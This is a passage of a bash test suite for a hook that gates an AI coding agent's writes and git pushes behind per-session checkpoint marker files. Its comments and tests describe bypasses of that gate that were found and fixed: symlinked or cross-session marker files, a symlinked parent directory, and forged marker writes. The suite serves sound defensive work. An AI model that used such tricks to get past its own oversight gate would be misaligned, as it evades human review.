DL_FAIL_OUT=$(echo "$(jq -n --arg fp "$TEST_DIR/scripts/x.mjs" --arg cwd "$TEST_DIR" --arg sid "$DL_FAIL_SID" \
  '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')" | HOME="$DL_FAIL_HOME" bash "$HOOK" 2>/dev/null)
if echo "$DL_FAIL_OUT" | grep -q '"decision".*"block"'; then
  echo "  ✓ DL-11. failed arm helper → write FAILS CLOSED (still blocked, not allowed ungated)"; ((passed++))
else
  echo "  ✗ DL-11. failed arm helper → expected block, got: $DL_FAIL_OUT"; ((failed++))
fi
assert_marker_absent "DL-12. failed arm did NOT create .checkpoint-required.<sid>" \
  "$MARKER_DIR/.checkpoint-required.$DL_FAIL_SID"
assert_marker_exists "DL-13. failed arm PRESERVED the approval token (not consumed — retry can arm)" \
  "$MARKER_DIR/.plan-approved.$DL_FAIL_SID"
rm -rf "$DL_FAIL_HOME"

# ============================================================================
echo ""
echo "--- Issue #362 regression: pre-done non-empty unlocks post-done write ---"
# ============================================================================
# Root cause being fixed: the natural agent flow `pre → finish → post → push`
# deadlocked because `.post-checkpoint-required` was armed only by the
# allowed-write tail (requires intervening Edit/Write/Bash between pre and post)
# or by push-gate self-arm (requires attempting push first). When the agent
# wrote pre-checkpoint then attempted post-checkpoint directly, the post-write
# was refused with the misleading "write the pre-checkpoint" message — even
# though pre-checkpoint was already on disk and non-empty.
#
# Fix: allow post-done write when POST_REQ armed OR PRE_DONE non-empty for
# this session. Push-gate (line 1485) still self-arms POST_REQ regardless,
# and push-gate (line 1525) still blocks push when POST_DONE is empty.
# Therefore push enforcement is unchanged — the fix only loosens the
# intermediate marker-write step, not the push gate.
#
# Empirical session: ca3b5e2f-... 2026-05-28, observed during PR #361 work.

# I362-1: Bash post-done write with PRE_DONE non-empty (no POST_REQ) → ALLOWED.
reset_state
I362_SID="aaaaaaaa-7777-4777-8777-aaaaaaaaaaaa"
echo "pre-checkpoint content for $I362_SID" > "$MARKER_DIR/.pre-checkpoint-done.$I362_SID"
assert_allowed "I362-1. Bash post-done write with PRE_DONE non-empty (no POST_REQ) — ALLOWED (#362 fix)" \
  "$(jq -n --arg cmd "echo 'post text' > $MARKER_DIR/.post-checkpoint-done.$I362_SID" \
    --arg cwd "$TEST_DIR" --arg sid "$I362_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')"

# I362-2: Edit/Write post-done write with PRE_DONE non-empty (no POST_REQ) → ALLOWED.
reset_state
echo "pre-checkpoint content for $I362_SID" > "$MARKER_DIR/.pre-checkpoint-done.$I362_SID"
assert_allowed "I362-2. Edit post-done write with PRE_DONE non-empty (no POST_REQ) — ALLOWED (#362 fix)" \
  "$(jq -n --arg fp "$MARKER_DIR/.post-checkpoint-done.$I362_SID" \
    --arg cwd "$TEST_DIR" --arg sid "$I362_SID" \
    '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')"

# I362-3: empty pre-done file does NOT count as satisfied → still blocks
# (negative control — `checkpoint_marker_nonempty_for_session` requires -s).
reset_state
: > "$MARKER_DIR/.pre-checkpoint-done.$I362_SID"   # zero-byte
assert_blocked "I362-3. Bash post-done write with EMPTY PRE_DONE (no POST_REQ) — still BLOCKED (-s required)" \
  "$(jq -n --arg cmd "echo 'post text' > $MARKER_DIR/.post-checkpoint-done.$I362_SID" \
    --arg cwd "$TEST_DIR" --arg sid "$I362_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Checkpoint required"

# I362-4: cross-session isolation — session B's PRE_DONE must NOT unlock
# session A's post-write. The predicate is session-suffixed, so another
# session's non-empty pre-done is ignored. (Failure mode would be: any prior
# session's leaked pre-checkpoint forever unlocks all future sessions' post
# writes — defeats per-session enforcement.)
reset_state
I362_SID_A="bbbbbbbb-8888-4888-8888-bbbbbbbbbbbb"
I362_SID_B="cccccccc-9999-4999-8999-cccccccccccc"
echo "B's pre-checkpoint" > "$MARKER_DIR/.pre-checkpoint-done.$I362_SID_B"
assert_blocked "I362-4. session A post-done write with only session B's PRE_DONE non-empty — BLOCKED (per-session)" \
  "$(jq -n --arg cmd "echo 'A post' > $MARKER_DIR/.post-checkpoint-done.$I362_SID_A" \
    --arg cwd "$TEST_DIR" --arg sid "$I362_SID_A" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Checkpoint required"

# I362-5: push-gate independence — with PRE_DONE non-empty (#362 fix path)
# but POST_DONE still empty, `git push` MUST still block via push-gate's
# independent POST_DONE non-emptiness check at line 1525. Proves the fix
# does not weaken push enforcement (the load-bearing gate).
reset_state
echo "pre" > "$MARKER_DIR/.pre-checkpoint-done.$I362_SID"
touch "$MARKER_DIR/.post-checkpoint-required.$I362_SID"   # simulate prior arm
# POST_DONE intentionally absent → push must block.
assert_blocked "I362-5. git push with PRE_DONE non-empty + POST_REQ armed + POST_DONE empty — push BLOCKED (push-gate independent)" \
  "$(jq -n --arg cmd 'git push origin main' --arg cwd "$TEST_DIR" --arg sid "$I362_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Post-implementation checkpoint required"

# ----------------------------------------------------------------------------
# DEADLOCK SIMULATIONS — walk the agent's natural workflow turn by turn,
# asserting each tool call's gate verdict, and prove the deadlock fix
# converges. Pre-fix the DL-EX-2 step would BLOCK with the misleading
# "write the pre-checkpoint" message even though pre-checkpoint is on disk
# and non-empty; post-fix it ALLOWS and the workflow proceeds linearly to
# push.
# ----------------------------------------------------------------------------

# DL-EX-A: natural workflow `pre → post → push` with NO intervening
# Edit/Write/Bash between pre-write and post-write (the exact 2026-05-28
# session ca3b5e2f-... deadlock). Pre-fix step 2 deadlocks; post-fix the
# flow runs end-to-end.
reset_state
DL_EX_SID="11111111-aaaa-4aaa-8aaa-111111111111"
seed_approval "$MARKER_DIR" "$DL_EX_SID"

# Step 1: agent finishes implementation, writes pre-checkpoint via Bash redirect
# (marker_write allowlist). This branch ALWAYS allowed pre-fix too.
assert_allowed "DL-EX-A.1 step1: Bash writes .pre-checkpoint-done.<sid> (allowed by marker_write)" \
  "$(jq -n --arg cmd "echo 'impl complete' > $MARKER_DIR/.pre-checkpoint-done.$DL_EX_SID" \
    --arg cwd "$TEST_DIR" --arg sid "$DL_EX_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')"
# Persist the effect: the gate doesn't actually execute the bash, so manually
# write the marker the gate just authorized (simulating the shell having run).
echo "impl complete" > "$MARKER_DIR/.pre-checkpoint-done.$DL_EX_SID"

# Step 2: agent writes post-checkpoint DIRECTLY (no intervening work). Pre-fix
# this BLOCKED with the misleading "write the pre-checkpoint" message
# (.post-checkpoint-required not armed). Post-fix this is ALLOWED because
# PRE_DONE is non-empty for this session — the bug #362 cure.
assert_allowed "DL-EX-A.2 step2: Bash writes .post-checkpoint-done.<sid> directly after pre — ALLOWED post-fix (was the deadlock)" \
  "$(jq -n --arg cmd "echo 'e2e done, no bugs' > $MARKER_DIR/.post-checkpoint-done.$DL_EX_SID" \
    --arg cwd "$TEST_DIR" --arg sid "$DL_EX_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')"
echo "e2e done, no bugs" > "$MARKER_DIR/.post-checkpoint-done.$DL_EX_SID"

# Step 3a: first push attempt — push-gate self-arms POST_REQ and blocks
# UNCONDITIONALLY (B1 hard-gate at :1517-1521 is TOCTOU-free: a marker created
# THIS invocation cannot already have a satisfied done-marker per the original
# design comment, and even when the agent has pre-written POST_DONE (post-#362)
# this first attempt still blocks — see idle-push tests 6/7/40/41 which behave
# the same way). This is the gate's hand-off moment: surface the post-checkpoint
# requirement, arm POST_REQ, expect the agent to retry.
assert_blocked "DL-EX-A.3a step3a: first git push self-arms POST_REQ + blocks (B1 hard-gate, TOCTOU-free)" \
  "$(jq -n --arg cmd 'git push origin main' --arg cwd "$TEST_DIR" --arg sid "$DL_EX_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Post-implementation checkpoint required"
assert_marker_exists "DL-EX-A.3b step3a self-armed .post-checkpoint-required.<sid>" \
  "$MARKER_DIR/.post-checkpoint-required.$DL_EX_SID"

# Step 3c: agent retries push. POST_REQ exists from step 3a, POST_DONE is
# non-empty from step 2 → push allowed. The PRE pair is swept (convergence for a
# future NEW task's fresh pre-checkpoint), but the POST pair is now
# own-session-STICKY — NOT swept — so the rest of this delivery (gh pr create /
# pr review) reuses it without re-block. Pre-fix the equivalent sequence was:
# pre → (post BLOCKED, misleading message) → push BLOCKED (self-arm) → post → push.
assert_allowed "DL-EX-A.3c step3b: retried git push with POST_REQ armed + POST_DONE non-empty — ALLOWED (workflow converges)" \
  "$(jq -n --arg cmd 'git push origin main' --arg cwd "$TEST_DIR" --arg sid "$DL_EX_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')"
# Verify the PRE/POST asymmetry: push sweeps the PRE pair (convergence) but KEEPS
# the POST pair sticky for the rest of the delivery.
assert_marker_absent "DL-EX-A.4 push sweep cleared .pre-checkpoint-done.<sid> (PRE convergence)" \
  "$MARKER_DIR/.pre-checkpoint-done.$DL_EX_SID"
assert_marker_exists "DL-EX-A.5 push KEPT .post-checkpoint-done.<sid> (POST sticky across delivery)" \
  "$MARKER_DIR/.post-checkpoint-done.$DL_EX_SID"
assert_marker_exists "DL-EX-A.6 push KEPT .post-checkpoint-required.<sid> (POST sticky)" \
  "$MARKER_DIR/.post-checkpoint-required.$DL_EX_SID"
# Step 4: the SAME delivery continues with a SECOND push-class action (gh pr
# create) — NO intervening edit. Pre-fix this re-blocked because the first push
# swept POST_DONE and the 2nd action self-armed POST_REQ + _block_post. Now the
# sticky post-checkpoint satisfies the gate → ALLOWED, no re-block. This is the
# exact reported symptom (push -> gh pr create -> gh pr review each re-demanding
# a post-checkpoint), now fixed.
assert_allowed "DL-EX-A.7 step4: gh pr create in the SAME delivery — ALLOWED, no re-block (symptom fixed)" \
  "$(jq -n --arg cmd 'gh pr create --title x --body y' --arg cwd "$TEST_DIR" --arg sid "$DL_EX_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')"
assert_marker_exists "DL-EX-A.8 gh pr create KEPT the sticky post-checkpoint (delivery continues)" \
  "$MARKER_DIR/.post-checkpoint-done.$DL_EX_SID"

# DL-EX-B: Edit-branch parity — same workflow but the agent uses Write/Edit
# instead of a Bash redirect to author the markers (the original symptom path
# in session ca3b5e2f-...: Write tool refused). Tests the :1322 branch.
reset_state
DL_EX_B_SID="22222222-bbbb-4bbb-8bbb-222222222222"
seed_approval "$MARKER_DIR" "$DL_EX_B_SID"

# Step 1: Write .pre-checkpoint-done.<sid> via Edit tool. The marker_write
# branch at :1313 handles this; arm-if-missing + allow.
PRE_FP_B="$MARKER_DIR/.pre-checkpoint-done.$DL_EX_B_SID"
assert_allowed "DL-EX-B.1 step1: Edit writes .pre-checkpoint-done.<sid> (allowed by marker_write Edit branch)" \
  "$(jq -n --arg fp "$PRE_FP_B" --arg cwd "$TEST_DIR" --arg sid "$DL_EX_B_SID" \
    '{tool_name:"Write",tool_input:{file_path:$fp,content:"pre"},cwd:$cwd,session_id:$sid}')"
echo "pre" > "$PRE_FP_B"

# Step 2: Write .post-checkpoint-done.<sid> directly. Pre-fix BLOCKED here
# (Edit branch at :1322 keyed on POST_REQ only); post-fix ALLOWED.
POST_FP_B="$MARKER_DIR/.post-checkpoint-done.$DL_EX_B_SID"
assert_allowed "DL-EX-B.2 step2: Edit writes .post-checkpoint-done.<sid> directly after pre — ALLOWED post-fix (was Edit-branch deadlock)" \
  "$(jq -n --arg fp "$POST_FP_B" --arg cwd "$TEST_DIR" --arg sid "$DL_EX_B_SID" \
    '{tool_name:"Write",tool_input:{file_path:$fp,content:"post"},cwd:$cwd,session_id:$sid}')"

# DL-EX-C: ANTI-REGRESSION — the truly-premature post write (no pre-checkpoint
# anywhere on disk) MUST still block, and the message MUST still tell the
# agent to write the pre-checkpoint (now accurately — pre IS missing).
reset_state
DL_EX_C_SID="33333333-cccc-4ccc-8ccc-333333333333"
DL_EX_C_OUT=$(echo "$(jq -n --arg cmd "echo 'fake' > $MARKER_DIR/.post-checkpoint-done.$DL_EX_C_SID" \
    --arg cwd "$TEST_DIR" --arg sid "$DL_EX_C_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" | run_hook 2>/dev/null)
if echo "$DL_EX_C_OUT" | grep -q '"decision".*"block"' \
   && echo "$DL_EX_C_OUT" | grep -q "Checkpoint required" \
   && echo "$DL_EX_C_OUT" | grep -q "pre-implementation"; then
  echo "  ✓ DL-EX-C anti-regression: post-done write with NO pre-checkpoint anywhere → BLOCKED with accurate pre-checkpoint message"; ((passed++))
else
  echo "  ✗ DL-EX-C anti-regression: expected block + pre-checkpoint message, got: $DL_EX_C_OUT"; ((failed++))
fi

# DL-EX-D: cross-session attack — session A starts fresh, session B has a
# non-empty pre-done from a previous task. Session A attempting post-done MUST
# NOT be unlocked by session B's pre-done (the per-session predicate guarantees
# this). If this assertion ever flips, the fix has accidentally introduced a
# cross-session bypass.
reset_state
DL_EX_D_SID_A="44444444-aaaa-4aaa-8aaa-44444444aaaa"
DL_EX_D_SID_B="44444444-bbbb-4bbb-8bbb-44444444bbbb"
echo "B's pre-checkpoint, A must not benefit" > "$MARKER_DIR/.pre-checkpoint-done.$DL_EX_D_SID_B"
assert_blocked "DL-EX-D cross-session: session A post-done with only B's PRE_DONE — BLOCKED" \
  "$(jq -n --arg cmd "echo 'A post' > $MARKER_DIR/.post-checkpoint-done.$DL_EX_D_SID_A" \
    --arg cwd "$TEST_DIR" --arg sid "$DL_EX_D_SID_A" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Checkpoint required"

# DL-EX-E: idempotent re-write — re-writing post-checkpoint after it's already
# non-empty (e.g. agent appends another bug entry to the same block) must
# remain allowed in the post-checkpoint phase. Verifies the fix preserves the
# existing "first write OR idempotent re-write" comment at :1187-1188.
reset_state
DL_EX_E_SID="55555555-eeee-4eee-8eee-555555555555"
echo "pre" > "$MARKER_DIR/.pre-checkpoint-done.$DL_EX_E_SID"
echo "post v1" > "$MARKER_DIR/.post-checkpoint-done.$DL_EX_E_SID"
assert_allowed "DL-EX-E idempotent: post-done re-write with PRE_DONE+POST_DONE both non-empty — ALLOWED" \
  "$(jq -n --arg cmd "echo 'post v2 (additional bug logged)' > $MARKER_DIR/.post-checkpoint-done.$DL_EX_E_SID" \
    --arg cwd "$TEST_DIR" --arg sid "$DL_EX_E_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')"

# ============================================================================
echo ""
echo "--- Issue #364: marker-read predicates reject symlinks (substrate trust) ---"
# ============================================================================
# Root cause being fixed: marker_exists / marker_nonempty /
# checkpoint_marker_*_for_session used `[ -e ]` / `[ -s ]` which follow
# symlinks. A `.pre-checkpoint-done.<sid>` symlinked to an outside-repo
# non-empty file satisfied the predicate and (post-#362) unlocked
# `.post-checkpoint-done.<sid>` writes through the new disjunction.
# Codex PR-level review of #363 confirmed empirically.
#
# Fix: precheck `[ ! -L "$path" ]` in all 4 marker-read helpers. No
# legitimate code path creates symlink markers — Write tool, Bash redirect,
# checkpoint-marker.mjs, touch all produce regular files. A symlink at a
# marker path signals substrate tampering and is refused.

# I364-1: symlink PRE_DONE -> outside non-empty file does NOT unlock post-write.
# Pre-fix this REPRODUCED the FU codex caught. Post-fix this BLOCKS.
reset_state
I364_SID="aaaa1364-1111-4111-8111-aaaa13641111"
# Outside-repo (tmp-host) non-empty file the attacker controls.
I364_OUTSIDE_DIR=$(mktemp -d)
I364_OUTSIDE_DIR="$(cd -P "$I364_OUTSIDE_DIR" && pwd)"
echo "attacker-controlled content (would satisfy [-s])" > "$I364_OUTSIDE_DIR/payload"
ln -s "$I364_OUTSIDE_DIR/payload" "$MARKER_DIR/.pre-checkpoint-done.$I364_SID"
assert_blocked "I364-1. symlink PRE_DONE -> outside non-empty file does NOT unlock post-write (#364 fix)" \
  "$(jq -n --arg cmd "echo 'post' > $MARKER_DIR/.post-checkpoint-done.$I364_SID" \
    --arg cwd "$TEST_DIR" --arg sid "$I364_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Checkpoint required"
rm -rf "$I364_OUTSIDE_DIR"

# I364-2: regular-file PRE_DONE still unlocks (negative control — the fix does
# not break the legitimate non-symlink path).
reset_state
echo "real pre" > "$MARKER_DIR/.pre-checkpoint-done.$I364_SID"
assert_allowed "I364-2. regular-file PRE_DONE non-empty still unlocks post-write (negative control)" \
  "$(jq -n --arg cmd "echo 'post' > $MARKER_DIR/.post-checkpoint-done.$I364_SID" \
    --arg cwd "$TEST_DIR" --arg sid "$I364_SID" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')"

# I364-3: symlink POST_REQ (the *required* arm marker) does NOT count as
# armed. Closes the parallel attack where an attacker symlinks
# .post-checkpoint-required to a benign file to fake the post-checkpoint
# phase entry. `checkpoint_marker_exists_for_session` now also rejects
# symlinks (was the existing-marker side of the same FU).
reset_state
I364_SID2="bbbb1364-2222-4222-8222-bbbb13642222"
I364_OUTSIDE_DIR=$(mktemp -d)
I364_OUTSIDE_DIR="$(cd -P "$I364_OUTSIDE_DIR" && pwd)"
: > "$I364_OUTSIDE_DIR/decoy"   # zero-byte (-e would pass; -L now rejects)
ln -s "$I364_OUTSIDE_DIR/decoy" "$MARKER_DIR/.post-checkpoint-required.$I364_SID2"
# PRE_DONE also absent → BOTH allow paths fail → block.
assert_blocked "I364-3. symlink POST_REQ -> outside file does NOT count as armed (#364 fix)" \
  "$(jq -n --arg cmd "echo 'post' > $MARKER_DIR/.post-checkpoint-done.$I364_SID2" \
    --arg cwd "$TEST_DIR" --arg sid "$I364_SID2" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Checkpoint required"
rm -rf "$I364_OUTSIDE_DIR"

# I364-4: symlinked PRE_DONE that points INTO the repo (to a legitimate
# repo file) is STILL rejected. The policy is "no symlinks at marker
# paths," not "no outside-repo symlinks" — defense-in-depth, since an
# in-repo symlink can also be cheaper to create as a bypass.
reset_state
I364_SID3="cccc1364-3333-4333-8333-cccc13643333"
# Symlink to a regular file inside the test repo.
mkdir -p "$TEST_DIR/data"
echo "in-repo content" > "$TEST_DIR/data/decoy"
ln -s "$TEST_DIR/data/decoy" "$MARKER_DIR/.pre-checkpoint-done.$I364_SID3"
assert_blocked "I364-4. symlink PRE_DONE -> in-repo file ALSO rejected (no symlinks at marker paths)" \
  "$(jq -n --arg cmd "echo 'post' > $MARKER_DIR/.post-checkpoint-done.$I364_SID3" \
    --arg cwd "$TEST_DIR" --arg sid "$I364_SID3" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Checkpoint required"

# I364-5: dangling symlink (target does not exist) — already failed `-s`
# pre-fix, but assert explicitly that post-fix it ALSO fails `[ ! -L ]`,
# so the rejection is consistent across target existence.
reset_state
I364_SID4="dddd1364-4444-4444-8444-dddd13644444"
ln -s "/nonexistent/path/that/does/not/exist" "$MARKER_DIR/.pre-checkpoint-done.$I364_SID4"
assert_blocked "I364-5. dangling symlink PRE_DONE — rejected (consistent regardless of target existence)" \
  "$(jq -n --arg cmd "echo 'post' > $MARKER_DIR/.post-checkpoint-done.$I364_SID4" \
    --arg cwd "$TEST_DIR" --arg sid "$I364_SID4" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Checkpoint required"

# I364-6: pre-gate side — symlinked .pre-checkpoint-done.<sid> does NOT
# unblock the pre-checkpoint gate either. The pre-gate uses the same
# `checkpoint_marker_nonempty_for_session` predicate at :1365; tests 19/20
# already cover empty/non-empty regular-file behavior. This adds the
# symlink case for that same predicate at a DIFFERENT call site.
reset_state
I364_SID5="eeee1364-5555-4555-8555-eeee13645555"
seed_approval "$MARKER_DIR" "$I364_SID5"
I364_OUTSIDE_DIR=$(mktemp -d)
I364_OUTSIDE_DIR="$(cd -P "$I364_OUTSIDE_DIR" && pwd)"
echo "decoy" > "$I364_OUTSIDE_DIR/payload"
# Arm the impl boundary first via a real Edit (planning-passive).
echo "$(jq -n --arg fp "$TEST_DIR/scripts/x.mjs" --arg cwd "$TEST_DIR" --arg sid "$I364_SID5" \
  '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')" | run_hook >/dev/null 2>&1
# Now symlink PRE_DONE to outside file and try another in-repo Edit; should
# STILL be blocked because the symlink is rejected.
ln -s "$I364_OUTSIDE_DIR/payload" "$MARKER_DIR/.pre-checkpoint-done.$I364_SID5"
assert_blocked "I364-6. pre-gate also rejects symlink PRE_DONE — Edit still blocked under armed checkpoint" \
  "$(jq -n --arg fp "$TEST_DIR/scripts/y.mjs" --arg cwd "$TEST_DIR" --arg sid "$I364_SID5" \
    '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')" "Checkpoint required"
rm -rf "$I364_OUTSIDE_DIR"

# I364-7: push-side — symlinked POST_DONE does NOT satisfy push gate's
# `.post-checkpoint-done` non-empty check at :1525. The non-empty check
# uses the same hardened predicate.
reset_state
I364_SID6="ffff1364-6666-4666-8666-ffff13646666"
echo "pre" > "$MARKER_DIR/.pre-checkpoint-done.$I364_SID6"
touch "$MARKER_DIR/.post-checkpoint-required.$I364_SID6"
I364_OUTSIDE_DIR=$(mktemp -d)
I364_OUTSIDE_DIR="$(cd -P "$I364_OUTSIDE_DIR" && pwd)"
echo "decoy post" > "$I364_OUTSIDE_DIR/payload"
ln -s "$I364_OUTSIDE_DIR/payload" "$MARKER_DIR/.post-checkpoint-done.$I364_SID6"
assert_blocked "I364-7. push gate rejects symlink POST_DONE — push still BLOCKED" \
  "$(jq -n --arg cmd 'git push origin main' --arg cwd "$TEST_DIR" --arg sid "$I364_SID6" \
    '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')" "Post-implementation checkpoint required"
rm -rf "$I364_OUTSIDE_DIR"

# I364-8 (codex round 3 P1 repro): writer/reader symlink-rejection
# AGREEMENT. The hardened READ predicate rejects a symlinked POST_REQ, so
# the gate enters the self-arm branch. Pre-#364-r3, the helper's
# `arm-if-missing` used `fs.existsSync` (follows symlinks) → returned
# noop:true → `_push_self_arm_created=0` → final read check ALSO returned
# false (hardened predicate) → push was ALLOWED with no POST_DONE.
#
# Post-#364-r3, the helper uses `lstatSync` and treats symlinks as
# "not present" → `arm-if-missing` proceeds → `atomicWriteEmpty`'s
# fs.renameSync replaces the symlink with a real file → helper returns
# noop:false → `_push_self_arm_created=1` → gate blocks unconditionally.
#
# Tests BOTH the helper path AND the bash fallback path (no installed helper).
reset_state
I364_SID7="cafe1364-7777-4777-8777-cafe13647777"
I364_OUTSIDE_DIR=$(mktemp -d)
I364_OUTSIDE_DIR="$(cd -P "$I364_OUTSIDE_DIR" && pwd)"
echo "attacker decoy POST_REQ target" > "$I364_OUTSIDE_DIR/decoy"
ln -s "$I364_OUTSIDE_DIR/decoy" "$MARKER_DIR/.post-checkpoint-required.$I364_SID7"
# No POST_DONE at all. With the bug, push would be allowed.
# Run with a fake HOME that has NO checkpoint-marker.mjs → exercises the
# bash fallback path.
I364_FAKE_HOME=$(mktemp -d)
I364_FAKE_HOME="$(cd -P "$I364_FAKE_HOME" && pwd)"
I364_PUSH_JSON="$(jq -n --arg cmd 'git push origin main' --arg cwd "$TEST_DIR" --arg sid "$I364_SID7" \
  '{tool_name:"Bash",tool_input:{command:$cmd},cwd:$cwd,session_id:$sid}')"
I364_PUSH_OUT=$(echo "$I364_PUSH_JSON" | HOME="$I364_FAKE_HOME" bash "$HOOK" 2>/dev/null)
if echo "$I364_PUSH_OUT" | grep -q '"decision".*"block"' \
   && echo "$I364_PUSH_OUT" | grep -q "Post-implementation checkpoint required"; then
  echo "  ✓ I364-8a (codex R3 P1 repro, bash fallback): symlinked POST_REQ → push BLOCKED (no bypass)"; ((passed++))
else
  echo "  ✗ I364-8a (codex R3 P1 repro, bash fallback): expected block, got: $I364_PUSH_OUT"; ((failed++))
fi
# After the push attempt, the symlink should have been REPLACED with a
# real regular file by _arm_marker_via_touch_safely (rm -f + touch).
if [ -L "$MARKER_DIR/.post-checkpoint-required.$I364_SID7" ]; then
  echo "  ✗ I364-8b (codex R3 P1): symlink POST_REQ was NOT replaced (still a symlink after self-arm)"; ((failed++))
elif [ -e "$MARKER_DIR/.post-checkpoint-required.$I364_SID7" ]; then
  echo "  ✓ I364-8b (codex R3 P1): symlink POST_REQ replaced by real file via _arm_marker_via_touch_safely"; ((passed++))
else
  echo "  ✗ I364-8b (codex R3 P1): POST_REQ missing after self-arm"; ((failed++))
fi
# Now repeat with a fake HOME that DOES have checkpoint-marker.mjs installed
# → exercises the helper path (the actionArmIfMissing fix in checkpoint-marker.mjs).
rm -f "$MARKER_DIR/.post-checkpoint-required.$I364_SID7"
ln -s "$I364_OUTSIDE_DIR/decoy" "$MARKER_DIR/.post-checkpoint-required.$I364_SID7"
I364_FAKE_HOME2=$(mktemp -d)
I364_FAKE_HOME2="$(cd -P "$I364_FAKE_HOME2" && pwd)"
mkdir -p "$I364_FAKE_HOME2/.episodic-memory/scripts/lib"
# Copy the real helper + its deps so it actually runs (lstat-aware fix is in here).
cp "$REPO_ROOT/scripts/checkpoint-marker.mjs" "$I364_FAKE_HOME2/.episodic-memory/scripts/checkpoint-marker.mjs"
cp -R "$REPO_ROOT/scripts/lib/." "$I364_FAKE_HOME2/.episodic-memory/scripts/lib/"
I364_PUSH_OUT2=$(echo "$I364_PUSH_JSON" | HOME="$I364_FAKE_HOME2" bash "$HOOK" 2>/dev/null)
if echo "$I364_PUSH_OUT2" | grep -q '"decision".*"block"' \
   && echo "$I364_PUSH_OUT2" | grep -q "Post-implementation checkpoint required"; then
  echo "  ✓ I364-8c (codex R3 P1 repro, helper path): symlinked POST_REQ → push BLOCKED (no bypass)"; ((passed++))
else
  echo "  ✗ I364-8c (codex R3 P1 repro, helper path): expected block, got: $I364_PUSH_OUT2"; ((failed++))
fi
if [ -L "$MARKER_DIR/.post-checkpoint-required.$I364_SID7" ]; then
  echo "  ✗ I364-8d (codex R3 P1, helper): symlink POST_REQ was NOT replaced"; ((failed++))
elif [ -e "$MARKER_DIR/.post-checkpoint-required.$I364_SID7" ]; then
  echo "  ✓ I364-8d (codex R3 P1, helper): symlink POST_REQ replaced by real file via atomic rename"; ((passed++))
else
  echo "  ✗ I364-8d (codex R3 P1, helper): POST_REQ missing after self-arm"; ((failed++))
fi
rm -rf "$I364_OUTSIDE_DIR" "$I364_FAKE_HOME" "$I364_FAKE_HOME2"

# I364-9: writer/reader agreement for .checkpoint-required arming via
# _arm_checkpoint_required_if_missing's bash fallback (:733). Pre-fix the
# bash `touch` followed a planted symlink, leaving the symlink in place;
# post-fix _arm_marker_via_touch_safely unlinks first. Tests the third
# bash-fallback site we hardened.
reset_state
I364_SID8="dead1364-8888-4888-8888-dead13648888"
seed_approval "$MARKER_DIR" "$I364_SID8"
I364_OUTSIDE_DIR=$(mktemp -d)
I364_OUTSIDE_DIR="$(cd -P "$I364_OUTSIDE_DIR" && pwd)"
echo "attacker decoy CR target" > "$I364_OUTSIDE_DIR/decoy"
ln -s "$I364_OUTSIDE_DIR/decoy" "$MARKER_DIR/.checkpoint-required.$I364_SID8"
I364_FAKE_HOME3=$(mktemp -d)
I364_FAKE_HOME3="$(cd -P "$I364_FAKE_HOME3" && pwd)"
# Trigger _arm_checkpoint_required_if_missing via an in-repo Edit (planning-passive
# implementation boundary). Use empty HOME so bash fallback runs.
echo "$(jq -n --arg fp "$TEST_DIR/scripts/x.mjs" --arg cwd "$TEST_DIR" --arg sid "$I364_SID8" \
  '{tool_name:"Edit",tool_input:{file_path:$fp},cwd:$cwd,session_id:$sid}')" \
  | HOME="$I364_FAKE_HOME3" bash "$HOOK" >/dev/null 2>&1 || true
if [ -L "$MARKER_DIR/.checkpoint-required.$I364_SID8" ]; then
  echo "  ✗ I364-9. _arm_checkpoint_required_if_missing bash fallback did NOT unlink planted symlink"; ((failed++))
elif [ -f "$MARKER_DIR/.checkpoint-required.$I364_SID8" ]; then
  echo "  ✓ I364-9. _arm_checkpoint_required_if_missing bash fallback unlinked + touched fresh file"; ((passed++))
else
  echo "  ✗ I364-9. .checkpoint-required.<sid> missing after arm"; ((failed++))
fi
rm -rf "$I364_OUTSIDE_DIR" "$I364_FAKE_HOME3"

# I364-10 (codex R4 P1 repro): symlinked PARENT directory `.checkpoints/`
# itself. Pre-fix: `mkdir -p .checkpoints` no-ops (parent already "exists"
# as a symlink to outside), `touch .checkpoints/<marker>` writes through
# the symlink to the outside directory — physical artifact lands outside
# the project root while the gate reports paths inside it. Codex repro'd
# this for both helper and bash-fallback paths in round 4.
#
# Post-fix: ensure_primary_dir / ensurePrimaryDir detects the symlinked
# parent, unlinks it, and recreates a real .checkpoints/ directory. The
# subsequent touch lands at the canonical location.
reset_state
I364_SID9="b00b1364-aaaa-4aaa-8aaa-b00b13649aaa"
I364_OUTSIDE_DIR=$(mktemp -d)
I364_OUTSIDE_DIR="$(cd -P "$I364_OUTSIDE_DIR" && pwd)"
mkdir -p "$I364_OUTSIDE_DIR/decoy-checkpoints"
